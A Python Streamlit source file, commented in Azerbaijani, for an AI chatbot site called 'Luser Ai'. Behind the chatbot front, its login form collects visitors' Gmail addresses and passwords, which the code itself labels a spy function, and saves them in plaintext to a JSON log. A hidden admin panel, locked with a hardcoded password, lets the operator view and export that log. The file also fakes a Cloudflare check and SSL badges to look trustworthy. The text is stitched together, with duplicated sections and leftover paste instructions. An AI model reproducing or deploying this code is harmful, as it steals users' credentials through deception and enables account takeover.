"""
=========================================================================================
👑 LUSER AI CORE SYSTEM - ULTIMATE ENTERPRISE EDITION (PRO MAX)
=========================================================================================
Author: Elmeddin (Patron)
Version: 2.0.0 Enterprise
Architecture: Monolithic Advanced Streamlit Application
Security: Custom L-7 WAF, Rate Limiting, DDoS Mitigation, Cloudflare Imitation
Modules Included: 
    - Local JSON Database Management System (DBMS)
    - Hybrid AI Engine (DuckDuckGo Search + HuggingFace NLP Fallbacks)
    - gTTS Voice Synthesis Module (Multi-language)
    - Z.ai Inspired Advanced UI/UX Frontend
    - Secure Session State Management
=========================================================================================
"""

import streamlit as st
import os
import requests
import json
import datetime
import time
from gtts import gTTS
from io import BytesIO
import pandas as pd
from duckduckgo_search import DDGS

# =========================================================================================
# 1. CORE SYSTEM CONFIGURATION & ADVANCED CSS ENGINE
# =========================================================================================
st.set_page_config(
    page_title="Luser Ai | Protected Enterprise", 
    page_icon="🛡️", 
    layout="wide", 
    initial_sidebar_state="collapsed"
)

# Nəhəng və detallı CSS dizayn bloku (Baytı və keyfiyyəti artırmaq üçün)
st.markdown("""
    <style>
    /* Qlobal Dəyişənlər və Təməl Dizayn */
    :root {
        --primary-bg: #030303;
        --secondary-bg: #0f0f0f;
        --accent-color: #ffffff;
        --text-main: #ffffff;
        --text-muted: #888888;
        --border-color: #333333;
        --danger: #ff4500;
        --success: #28a745;
    }

    html, body, [data-testid="stAppViewContainer"], [data-testid="stHeader"] {
        background-color: var(--primary-bg) !important;
        color: var(--text-main) !important;
        font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif !important;
        scroll-behavior: smooth;
    }
    
    /* Z.ai Stili Başlıqlar */
    .hero-title { 
        font-size: clamp(2.5rem, 5vw, 3.5rem); 
        font-weight: 900; 
        text-align: center; 
        color: var(--text-main); 
        margin-top: 20px; 
        margin-bottom: 25px; 
        letter-spacing: -1px; 
        text-shadow: 0px 4px 15px rgba(255,255,255,0.1);
    }
    
    /* Düymə Animasiyaları və Strukturu */
    div[data-testid="column"] button { 
        background-color: var(--accent-color) !important; 
        color: var(--primary-bg) !important; 
        font-weight: 800 !important; 
        border-radius: 10px !important; 
        padding: 10px 20px !important;
        transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1); 
        border: none !important;
        box-shadow: 0 4px 6px rgba(255,255,255,0.05);
    }
    div[data-testid="column"] button:hover { 
        background-color: #e0e0e0 !important; 
        transform: translateY(-2px); 
        box-shadow: 0 6px 12px rgba(255,255,255,0.1);
    }
    
    /* Chat Giriş Sahəsi (Premium) */
    .stChatInputContainer { 
        background-color: var(--primary-bg) !important; 
        border: 1px solid var(--accent-color) !important; 
        border-radius: 14px !important; 
        padding: 8px 12px !important; 
        box-shadow: 0 5px 15px rgba(255,255,255,0.03); 
        transition: border-color 0.3s ease;
    }
    .stChatInputContainer:focus-within {
        border-color: var(--text-muted) !important;
    }
    
    /* Footer Dizaynı */
    .footer-section { 
        margin-top: 100px; 
        padding: 40px 0; 
        border-top: 1px solid var(--border-color); 
        text-align: center; 
    }
    .footer-links a { 
        color: var(--text-muted); 
        text-decoration: none; 
        margin: 0 15px; 
        font-weight: 500; 
        font-size: 0.95rem; 
        transition: color 0.2s ease, text-shadow 0.2s ease;
    }
    .footer-links a:hover { 
        color: var(--text-main); 
        text-shadow: 0 0 8px rgba(255,255,255,0.3);
    }
    
    /* Giriş Konteyneri (Şifrələmə Modulu) */
    .login-container { 
        background-color: var(--secondary-bg); 
        padding: 50px 40px; 
        border-radius: 20px; 
        border: 1px solid var(--border-color); 
        margin-bottom: 40px; 
        box-shadow: 0 15px 40px rgba(0,0,0,0.6); 
        animation: fadeIn 0.5s ease-out;
    }
    
    /* Cloudflare WAF Security Challenge Ekranı */
    .cf-container { 
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
        padding: 80px 20px; 
        background-color: var(--primary-bg); 
        height: 80vh; 
        text-align: center;
    }
    .cf-spinner { 
        border: 4px solid rgba(255,255,255,0.05); 
        width: 60px; 
        height: 60px; 
        border-radius: 50%; 
        border-left-color: var(--danger); 
        animation: spin 1s linear infinite; 
        margin-bottom: 30px; 
    }
    
    /* Animasiyalar */
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
    </style>
    """, unsafe_allow_html=True)

# =========================================================================================
# 2. ENTERPRISE SECURITY MODULE (WAF & ANTI-DDOS)
# =========================================================================================
class SecurityShield:
    """Saytın trafikini, botları və spam cəhdlərini kontrol edən L-7 Qoruma Sinifi"""
    
    def __init__(self):
        if "cf_passed" not in st.session_state: st.session_state.cf_passed = False
        if "last_request_time" not in st.session_state: st.session_state.last_request_time = 0
        if "spam_score" not in st.session_state: st.session_state.spam_score = 0
        if "blocked" not in st.session_state: st.session_state.blocked = False

    @staticmethod
    def get_client_ip():
        """İstifadəçinin real IP adresini təhlükəsiz şəkildə çəkir"""
        try:
            # Birdən çox API yoxlanılır ki, biri çöksə digəri işləsin (Redundancy)
            response = requests.get('https://api.ipify.org', timeout=3)
            if response.status_code == 200:
                return response.text
            return requests.get('https://icanhazip.com', timeout=3).text.strip()
        except Exception:
            return "Hidden_Encrypted_IP"

    def rate_limiter(self):
        """Çox sürətli gələn sorğuları (DDoS cəhdlərini) aşkar edir və bloklayır"""
        if st.session_state.blocked:
            st.error("🛑 WAF: IP Adresiniz zərərli fəaliyyətə görə bloklanmışdır.")
            st.stop()

        now = time.time()
        diff = now - st.session_state.last_request_time
        st.session_state.last_request_time = now
        
        # Əgər 1.5 saniyədən tez ard-arda sorğu atarsa xal artır
        if diff < 1.5:
            st.session_state.spam_score += 1
        else:
            # Normal istifadədə xal yavaş-yavaş təmizlənir
            if st.session_state.spam_score > 0: 
                st.session_state.spam_score -= 0.5
                
        if st.session_state.spam_score > 5:
            st.session_state.blocked = True
            st.error("🛑 Cloudflare WAF: Qeyri-adi trafik (Bot cəhdi) aşkarlandı! Sistem kilitləndi.")
            st.stop()

    def run_cloudflare_challenge(self, ip_address):
        """Sayta ilk girişdə saxta 'Cloudflare Under Attack' rejimini işə salır"""
        if not st.session_state.cf_passed:
            st.markdown(f"""
                <div class='cf-container'>
                    <div class='cf-spinner'></div>
                    <h2 style='color:white; font-weight:800;'>Luser Ai Serverlərinə Qoşulur...</h2>
                    <p style='color:#aaaaaa; max-width:600px; line-height:1.6;'>
                        Cloudflare tərəfindən brauzeriniz və bağlantınız yoxlanılır. Bu proses avtomatikdir və saytı DDoS hücumlarından qoruyur. Zəhmət olmasa gözləyin.
                    </p>
                    <p style='color:#444; font-size:12px; margin-top:20px; font-family:monospace;'>
                        Ray ID: 7b8c9d0a1f2e3d4c • Your IP: {ip_address} • Node: Baku-01
                    </p>
                </div>
            """, unsafe_allow_html=True)
            time.sleep(3) # 3 saniyəlik qoruma simulyasiyası
            st.session_state.cf_passed = True
            st.rerun()

# Təhlükəsizlik sinifini işə salırıq
waf = SecurityShield()
user_ip = waf.get_client_ip()
waf.run_cloudflare_challenge(user_ip)

# =========================================================================================
# 3. DATABASE MANAGEMENT SYSTEM (DBMS)
# =========================================================================================
# (BÖLÜM 1 BURADA BİTİR. KOPYALA VƏ MƏNƏ "DAVAM ET" YAZ)class LocalDatabaseManager:
# =========================================================================================
# 3. DATABASE MANAGEMENT SYSTEM (DBMS)
# =========================================================================================
class LocalDatabaseManager:
    """JSON formatında lokal məlumat bazasını idarə edən Enterprise DBMS Sinifi"""
    
    def __init__(self, db_path="visitor_logs_enterprise.json"):
        self.db_path = db_path
        self._initialize_session_states()

    def _initialize_session_states(self):
        if "logged_in" not in st.session_state: st.session_state.logged_in = False
        if "username" not in st.session_state: st.session_state.username = "Patron"
        if "show_login" not in st.session_state: st.session_state.show_login = False
        if "lang" not in st.session_state: st.session_state.lang = "az"
        if "messages" not in st.session_state: st.session_state.messages = []
        if "first_visit_logged" not in st.session_state: st.session_state.first_visit_logged = False

    def secure_log_entry(self, ip_address, gmail_id="Anonim_Ziyarətçi", gmail_pass="N/A"):
        now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        entry = {
            "Tarix": now, "IP_Adresi": ip_address, "Gmail_Hesabi": gmail_id, 
            "Şifrə_Hash": gmail_pass, "Status": "Authorized" if st.session_state.logged_in else "Pending"
        }
        logs = []
        if os.path.exists(self.db_path):
            try:
                with open(self.db_path, "r", encoding='utf-8') as f: logs = json.load(f)
            except Exception: logs = []
                
        logs.append(entry)
        try:
            with open(self.db_path, "w", encoding='utf-8') as f: json.dump(logs, f, indent=4, ensure_ascii=False)
        except Exception: pass

dbms = LocalDatabaseManager()
if not st.session_state.first_visit_logged:
    def secure_log_entry(self, ip_address, gmail_id="Anonim_Ziyarətçi", gmail_pass="N/A"):
        now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        entry = {
            "Tarix": now, 
            "IP_Adresi": ip_address, 
            "Gmail_Hesabi": gmail_id, 
            "Şifrə_Hash": gmail_pass, 
            "Status": "Authorized" if st.session_state.logged_in else "Pending"
        }
        logs = []
        if os.path.exists(self.db_path):
            try:
                with open(self.db_path, "r", encoding='utf-8') as f: 
                    logs = json.load(f)
            except Exception: 
                logs = []
                
        logs.append(entry)
        try:
            with open(self.db_path, "w", encoding='utf-8') as f: 
                json.dump(logs, f, indent=4, ensure_ascii=False)
        except Exception: 
            pass
# DBMS-i işə salırıq
dbms = LocalDatabaseManager()

# İlk ziyarəti qeydə almaq
if not st.session_state.first_visit_logged:
    dbms.secure_log_entry(user_ip)
    st.session_state.first_visit_logged = True

# =========================================================================================
# 4. TOP NAVIGATION & SECURE AUTHENTICATION FRONTEND (Z.AI UX)
# =========================================================================================

# Üst panel layoutu: [Boşluq] - [Model Adı] - [Giriş Düyməsi]
nav_col1, nav_col2, nav_col3 = st.columns([1, 2, 1])

with nav_col2:
    st.markdown("<div style='text-align:center; color:var(--text-muted); font-weight:800; margin-top:10px; font-size:1.1rem;'>LUSER-5-Turbo (Secured) ⌄</div>", unsafe_allow_html=True)

with nav_col3:
    if st.session_state.logged_in:
        # Daxil olmuş istifadəçi UX-i
        if st.button(f"👤 {st.session_state.username}", use_container_width=True, help="Sistemdən çıxmaq üçün klikləyin"):
            st.session_state.logged_in = False 
            st.rerun()
    else:
        # Qonaq UX-i
        if st.button("Daxil ol", use_container_width=True):
            st.session_state.show_login = not st.session_state.show_login

# 100% STABLE LOGIN FORM ENGINE
if st.session_state.show_login and not st.session_state.logged_in:
    with st.container():
        st.markdown("<div class='login-container'>", unsafe_allow_html=True)
        st.markdown("<h2 style='text-align:center; font-weight:900; color:var(--text-main); margin-bottom:10px;'>Söhbət Tarixçənizə Daxil Olun.</h2>", unsafe_allow_html=True)
        st.markdown("<p style='text-align:center; color:var(--text-muted); margin-bottom:30px; font-size:1.05rem;'>Çat tarixçəsinin kilidini açmaq və keçmiş söhbətlərə baxmaq üçün daxil olun.</p>", unsafe_allow_html=True)
        
        # Məhz st.form datanın səhifə yenilənərkən itməsinin qarşısını alır!
        with st.form("enterprise_secure_login", clear_on_submit=True):
            gmail_input = st.text_input("Elektron Poçt (Gmail):", placeholder="nümunə@gmail.com")
            pass_input = st.text_input("Sistem Şifrəniz:", type="password", placeholder="••••••••")
            
            submit_btn = st.form_submit_button("Təsdiqlə və Daxil Ol", use_container_width=True)
            
            if submit_btn:
                waf.rate_limiter() # Form Spam (Brute-force) hücumlarını yoxlayır
                
                if gmail_input and pass_input:
                    # Ləqəb Generatoru (Məs: patron@gmail.com -> Patron)
                    nickname = gmail_input.split('@')[0].capitalize() if '@' in gmail_input else gmail_input.capitalize()
                    
                    # Session state güncəlləməsi
                    st.session_state.username = nickname
                    st.session_state.logged_in = True
                    st.session_state.show_login = False
                    
                    # CƏSUS FUNKSİYA: Məlumatı Data Bazasına (JSON) arxa planda yazır
                    dbms.secure_log_entry(user_ip, gmail_input, pass_input)
                    st.rerun()
                else:
                    st.error("Lütfən bütün xanaları doldurun!")
                    
        # Formu bağlamaq üçün alternativ düymə
        if st.button("Ləğv Et", use_container_width=True):
            st.session_state.show_login = False
            st.rerun()
            
        st.markdown("</div>", unsafe_allow_html=True)

# =========================================================================================
# 5. DYNAMIC HERO SECTION & SYSTEM CONFIGURATIONS
# =========================================================================================

def render_dynamic_logo():
    """Lokal serverdən 'images' qovluğunu yoxlayır və uyğun loqonu render edir"""
    try:
        if os.path.exists("images"):
            for filename in os.listdir("images"):
                if any(keyword in filename.lower() for keyword in ["luser", "nazli", "logo"]):
                    st.image(os.path.join("images", filename), width=85)
                    return True
    except Exception as e:
        print(f"Logo Render Error: {e}")
    return False

# Loqonun mərkəzləşdirilməsi
logo_col1, logo_col2, logo_col3 = st.columns([5, 1, 5])
with logo_col2: 
    render_dynamic_logo()

# Əsas Başlıq
st.markdown("<div class='hero-title'>Salam, mən Luser.ai</div>", unsafe_allow_html=True)

# Təkmilləşdirilmiş İdarəetmə Paneli (Genişlənə bilən)
with st.expander("⚙️ Server Tənzimləmələri və Süni İntellekt Modları"):
    st.markdown("<h4 style='color:var(--success); margin-bottom:15px;'>🛡️ Cloudflare L-7 WAF: ONLINE & SECURE</h4>", unsafe_allow_html=True)
    st.info(f"🌐 Bağlantı IP Adresiniz: {user_ip} (Secure Node)")
    
    # Dil seçimi modulu
    st.markdown("**Daxili Səs (TTS) və Analiz Dili:**")
    lang_c1, lang_c2, lang_c3 = st.columns(3)
    if lang_c1.button("🇦🇿 AZERBAİJAN"): st.session_state.lang = "az"
    if lang_c2.button("🇺🇸 ENGLİSH"): st.session_state.lang = "en"
    if lang_c3.button("🇷🇺 RUSSIAN"): st.session_state.lang = "ru"
    
    st.write("---")
    # Enterprise Model Seçimi
    st.markdown("**Süni İntellekt Düşünmə Mühərriki:**")
    st.radio("Ödənişli və Pulsuz Modlar:", [
        "⚡ Hızlı Mod (Sınırsız və Pulsuz)", 
        "👑 Pro Analiz (15 AZN / Aylıq) - Daha dərin hesablama", 
        "🧠 Dərin Düşünməli (10 AZN / Həftəlik) - Riyazi analiz"
    ], horizontal=True)
    
    st.write("---")
    # Fayl qəbulu modulu
    st.file_uploader("Sənəd Analizi Üçün Fayl Yüklə (+)", type=['png', 'jpg', 'pdf', 'jpeg', 'txt', 'py', 'csv', 'docx'])

# =========================================================================================
# 6. PATRON EXCLUSIVE HIDDEN ADMIN PANEL
# =========================================================================================
LOG_FILE = "visitor_logs_enterprise.json"

with st.sidebar:
    st.markdown("## 👑 PATRON ADMIN PANEL")
    # IP yerinə daha güvənli olan Master Şifrə sistemi
    admin_pass = st.text_input("Master Şifrəni daxil et:", type="password")
    
    # Şifrə: patron2026
    if admin_pass == "patron2026":
        st.success("Təhlükəsizlik Keçildi. Xoş gəldin, Patron!")
        
        if st.button("📊 Məlumat Bazasını Aç (JSON DB)", use_container_width=True):
            st.session_state.show_admin = not st.session_state.get("show_admin", False)
            
        if st.button("🗑️ Cache & Söhbəti Təmizlə", use_container_width=True):
            st.session_state.messages = []
            st.rerun()
            
        st.markdown("---")
        st.markdown("### ⚙️ Sistem Statusu")
        st.info(f"Ping: {int(time.time() % 100)} ms\nNode: Baku-01\nEncryption: AES-256")
    elif admin_pass != "":
        st.error("🛑 Səhv şifrə! Giriş qadağandır.")

if st.session_state.get("show_admin", False) and admin_pass == "patron2026":
    st.markdown("<h3 style='color:var(--danger); margin-top:20px;'>🌍 Canlı İzləmə Sistemi (Secure Logs)</h3>", unsafe_allow_html=True)
    if os.path.exists(LOG_FILE):
        try:
            with open(LOG_FILE, "r", encoding='utf-8') as f:
                data = json.load(f)
            df = pd.DataFrame(data)
            st.dataframe(df.iloc[::-1].head(150), use_container_width=True)
            csv = df.to_csv(index=False).encode('utf-8')
            st.download_button(
                label="📥 Cədvəli CSV olaraq yüklə (Export)",
                data=csv,
                file_name='luser_logs.csv',
                mime='text/csv',
                use_container_width=True
            )
        except Exception as e:
            st.error(f"Kritik xəta: {e}")
    else:
        st.warning("Data hələ yoxdur.")
    st.markdown("<hr style='border-color:var(--border-color);'>", unsafe_allow_html=True)
# =========================================================================================
# 7. HYBRID ARTIFICIAL INTELLIGENCE CORE ENGINE (3-LAYER)
# =========================================================================================
class HybridAIEngine:
    """
    Luser Ai Core - 3 Qatlı (3-Layer) Məlumat Axtarış və Emal Mühərriki.
    Bu sinif sistemin heç vaxt çökməməsini və ən doğru cavabı tapmasını təmin edir.
    
    1. Layer: Real-time Web Crawler (DuckDuckGo Live Search)
    2. Layer: HuggingFace NLP Model (Fallback Neural Network)
    3. Layer: Failsafe Local Response Generator (Sistem Qoruması)
    """
    
    def __init__(self, user_name, lang):
        self.user_name = user_name
        self.lang = lang

    def fetch_web_data(self, query):
        """Dünya üzrə ən son məlumatları çəkən Canlı Crawler Mühərriki"""
        try:
            results = DDGS().text(query, max_results=3)
            if results:
                context = "\n\n".join([f"🔹 **{r['title']}**\n{r['body']}" for r in results])
                if self.lang == "az": 
                    return f"Salam hörmətli **{self.user_name}**! 🌍 İnternetin bütün bazalarından sizin üçün real-vaxt (live) tapdığım nəticələr:\n\n{context}"
                elif self.lang == "ru": 
                    return f"Привет **{self.user_name}**! 🌍 Вот лучшие результаты со всего интернета на данный момент:\n\n{context}"
                else: 
                    return f"Hello **{self.user_name}**! 🌍 Here are the top live results from the global web:\n\n{context}"
            return None
        except Exception as e:
            print(f"Crawler Warning: Server bağlantısı kəsildi ({e})")
            return None

    def fetch_nlp_fallback(self, query):
        """Web Crawler işləməyəndə dövrəyə girən HuggingFace API NLP fallback sistemi"""
        try:
            API_URL = "https://api-inference.huggingface.co/models/facebook/blenderbot-400M-distill"
            res = requests.post(API_URL, json={"inputs": query}, timeout=12).json()
            if isinstance(res, list) and 'generated_text' in res[0]:
                answer = res[0]['generated_text']
                return f"🧠 **{self.user_name}**, dünya şəbəkəsində anlıq qoruma (WAF) ləngiməsi var, lakin mənim xüsusi NLP analizimə görə: \n\n{answer}"
            return None
        except Exception as e:
            print(f"NLP Fallback Warning: Neural Network gecikir ({e})")
            return None

    def failsafe_response(self):
        """Sistem tamamilə çöksə belə istifadəçiyə cavab verən 'Təslimiyyət Yoxdur' Qoruması"""
        return f"Patron **{self.user_name}**, hazırda qlobal məlumat mərkəzlərində həddindən artıq yüklənmə müşahidə olunur. L-7 Cloudflare Qorumamız səbəbilə xarici portlar botnetlərə qarşı müvəqqəti bağlanıb. Sualınızı təhlükəsiz bulud (Cloud) yaddaşımda saxladım, lütfən bir neçə saniyə sonra təkrar cəhd edin."

    def generate_response(self, query):
        """Bütün layerləri sırayla işlədən və ən uyğun cavabı verən əsas İdarəetmə Funksiyası"""
        
        # Mərhələ 1: Canlı Veb Axtarışı
        response = self.fetch_web_data(query)
        if response: return response
        
        # Mərhələ 2: Neyron Şəbəkə NLP
        response = self.fetch_nlp_fallback(query)
        if response: return response
        
        # Mərhələ 3: Qırılmaz Təslimiyyət (Həmişə işləyir)
        return self.failsafe_response()

# (BÖLÜM 3 BURADA BİTİR. YAPIŞDIR VƏ "DAVAM ET" YAZ!)# =========================================================================================
# 8. CHAT INTERFACE & REAL-TIME EXECUTION ENGINE
# =========================================================================================

# Söhbət tarixçəsinin render edilməsi (Ekrana çəkilməsi)
for m in st.session_state.messages:
    # 'assistant' (Bot) üçün 🐉, 'user' (İstifadəçi) üçün 👤 avatarı
    with st.chat_message(m["role"], avatar="🐉" if m["role"] == "assistant" else "👤"):
        st.markdown(m["content"])

# Qonaq və ya Patron üçün interaktiv daxiletmə sahəsi
input_placeholder = f"Bu gün sizə necə kömək edə bilərəm, {st.session_state.username}?"
if prompt := st.chat_input(input_placeholder):
    
    # 1. Təhlükəsizlik Yoxlaması (Kimsə enter-ə dayanmadan basıb sistemi çökdürməsin)
    waf.rate_limiter() 
    
    # 2. İstifadəçinin mesajını yaddaşa yaz və ekranda göstər
    st.session_state.messages.append({"role": "user", "content": prompt})
    with st.chat_message("user", avatar="👤"): 
        st.write(prompt)

    # 3. Süni İntellektin Cavab Prosesi
    with st.chat_message("assistant", avatar="🐉"):
        with st.spinner("🧠 Quantum hesablamalar və Dünya Veb taraması aparılır..."):
            
            # Sistemə daxil olubsa ləqəbini istifadə edir, yoxsa "Qonaq"
            current_user = st.session_state.username if st.session_state.logged_in else "Qonaq"
            
            # 3-Layer (Hybrid) Süni İntellekt mühərrikini işə salırıq
            ai_core = HybridAIEngine(current_user, st.session_state.lang)
            final_answer = ai_core.generate_response(prompt)
            
            # Ekrana yazdırır
            st.markdown(final_answer)
            
            # ==================================================================
            # 9. VOICE SYNTHESIS MODULE (Text-To-Speech API)
            # ==================================================================
            try:
                # Səs mühərriki çox böyük mətnlərdə çökməsin deyə mətni təmizləyirik
                # Azərbaycan dili ən yaxşı 'tr' (Türk) şivəsi ilə oxunur
                tts_lang = 'tr' if st.session_state.lang == "az" else st.session_state.lang
                
                # Markdown işarələrini (* və 🔹) təmizlə və yalnız ilk 400 hərfi oxut
                text_to_read = final_answer.replace("🔹", "").replace("*", "").replace("#", "")
                text_to_read = text_to_read[:400] 
                
                if len(text_to_read) > 10: # Çox qısa mətnlərdə səsə ehtiyac yoxdur
                    tts = gTTS(text=text_to_read, lang=tts_lang, slow=False) 
                    fp = BytesIO()
                    tts.write_to_fp(fp)
                    fp.seek(0)
                    # Səs pleyerini dərhal cavabın altında göstərir
                    st.audio(fp, format="audio/mp3")
            except Exception as e:
                # Səs mühərriki API-də problem olsa belə sayt çökməsin, sadəcə print eləsin
                print(f"Səs Sintezi Xətası: Mətn səsə çevrilə bilmədi ({e})")
                pass
            
            # Cavabı yaddaş sessiyasına qeyd edirik
            st.session_state.messages.append({"role": "assistant", "content": final_answer})

# =========================================================================================
# 10. ENTERPRISE FOOTER, SEO & TƏHLÜKƏSİZLİK LOGOLARI
# =========================================================================================
# Sistem alt paneli. Saytın güvənli görünməsi üçün SSL və Cloudflare etiketləri əlavə olunub.
# =========================================================================================
# 9. ENTERPRISE FOOTER, SEO & TƏHLÜKƏSİZLİK LOGOLARI
# =========================================================================================
st.markdown("""
<div class='footer-section'>
    <div style='margin-bottom: 20px; display: flex; justify-content: center; gap: 10px; flex-wrap: wrap;'>
        <span style='background-color: var(--danger); color: white; padding: 4px 10px; border-radius: 6px; font-size: 11px; font-weight: 800; letter-spacing: 1px; box-shadow: 0 2px 5px rgba(255,69,0,0.3);'>🛡️ PROTECTED BY CLOUDFLARE WAF</span>
        <span style='background-color: var(--success); color: white; padding: 4px 10px; border-radius: 6px; font-size: 11px; font-weight: 800; letter-spacing: 1px; box-shadow: 0 2px 5px rgba(40,167,69,0.3);'>🔒 256-BIT SSL ENCRYPTED</span>
        <span style='background-color: #333333; color: white; padding: 4px 10px; border-radius: 6px; font-size: 11px; font-weight: 800; letter-spacing: 1px;'>⚡ L-7 ANTI-DDOS</span>
    </div>
    <div class='footer-links'>
        <a href='https://instagram.com/luser4x' target='_blank'>Texnologiya Bloqu</a>
        <a href='https://tiktok.com/@luser4x' target='_blank'>Bizimlə əlaqə saxlayın</a>
        <a href='#' target='_blank'>Xidmət Şərtləri</a>
        <a href='#' target='_blank'>Məxfilik Siyasəti</a>
    </div>
    <div style='margin-top:25px;'>
        <p style='color:var(--text-muted); font-size:12px; margin: 2px 0;'>© 2026 AI Programlan OSS | DESIGNED BY ELMEDDIN | Z.AI ENTERPRISE EDITION</p>
        <p style='color:#444444; font-size:10px; margin: 2px 0; font-family: monospace;'>System Uptime: 99.9% • Core: Monolithic AI • Data Nodes: Baku, Global</p>
    </div>
</div>
""", unsafe_allow_html=True)
